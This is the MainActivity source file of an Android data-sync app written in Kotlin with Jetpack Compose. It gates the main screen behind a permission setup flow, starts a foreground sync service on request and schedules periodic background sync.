package com.boxx.datasync

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.viewModels
import androidx.compose.foundation.isSystemInDarkTheme
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.permission.PermissionViewModel
import com.boxx.datasync.sync.SyncScheduler
import com.boxx.datasync.sync.SyncService
import com.boxx.datasync.ui.screen.MainScreen
import com.boxx.datasync.ui.screen.PermissionSetupScreen
import com.boxx.datasync.ui.viewmodel.MainViewModel
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    private val viewModel: MainViewModel by viewModels()
    private val permissionViewModel: PermissionViewModel by viewModels()

    @Inject
    lateinit var repository: DataRepository

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d("MainActivity", "PROJECT_SCAN_DONE")
        Log.d("MainActivity", "FIREBASE_CONFIG_VERIFIED project_id=boxxx-40178 userPackage=com.boxx.datasync adminPackage=com.datasync.admin")
        viewModel.updateHeartbeat()

        setContent {
            MaterialTheme(
                colorScheme = if (isSystemInDarkTheme()) darkColorScheme() else lightColorScheme()
            ) {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    val context = androidx.compose.ui.platform.LocalContext.current
                    val allGranted = permissionViewModel.statuses.collectAsState().value.let {
                        permissionViewModel.areAllRequiredGranted()
                    }

                    if (allGranted) {
                        LaunchedEffect(Unit) {
                            (context.applicationContext as? UserApplication)?.setupContentObservers()
                        }
                        MainScreen(
                            viewModel = viewModel,
                            onSyncClick = {
                                Log.d("MainActivity", "SYNC_BUTTON_CLICKED")
                                viewModel.setSyncing()
                                startSyncService(context)
                            },
                            showSettings = {
                                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                    data = Uri.fromParts("package", packageName, null)
                                }
                                startActivity(intent)
                            }
                        )
                    } else {
                        PermissionSetupScreen(
                            viewModel = permissionViewModel,
                            onAllGranted = {
                                permissionViewModel.refreshStatuses()
                            }
                        )
                    }
                }
            }
        }
        setupWorkManager()
    }

    override fun onResume() {
        super.onResume()
        permissionViewModel.refreshStatuses()
    }

    private fun setupWorkManager() {
        SyncScheduler.schedulePeriodic(this)
    }

    private fun startSyncService(context: android.content.Context) {
        val intent = Intent(context, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
        (applicationContext as? UserApplication)?.setupContentObservers()
    }

}
